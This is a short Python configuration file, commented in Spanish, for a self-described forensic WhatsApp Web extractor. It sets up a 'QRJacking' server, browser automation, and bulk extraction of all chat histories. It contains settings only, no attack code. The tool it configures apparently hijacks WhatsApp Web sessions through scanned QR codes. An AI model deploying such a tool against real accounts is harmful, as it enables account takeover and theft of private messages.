"""
Configuracion centralizada del extractor forense de WhatsApp Web.
TODOS los valores son para entornos controlados y propios.
"""
import os

# --- Servidor QRJacking ---
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8080
PUBLIC_URL = "http://192.168.100.35:8080"  # <- Cambia esto por tu IP local

# --- Selenium ---
HEADLESS = False          # True para ocultar el navegador (menos estable con WA Web)
BROWSER = "firefox"       # "firefox" o "chrome"
GECKODRIVER_PATH = None   # None = buscar en PATH
CHROMEDRIVER_PATH = None

# --- Extraccion ---
OUTPUT_DIR = "./evidencias"
MAX_SCROLLS_PER_CHAT = 200      # Scrolls hacia arriba por chat para cargar historial
SCROLL_PAUSE = 1.5              # Segundos entre scrolls
MAX_CHATS = None                # None = todos los chats; N = solo los primeros N

# --- Logging ---
LOG_LEVEL = "INFO"
LOG_FILE = "./extractor.log"
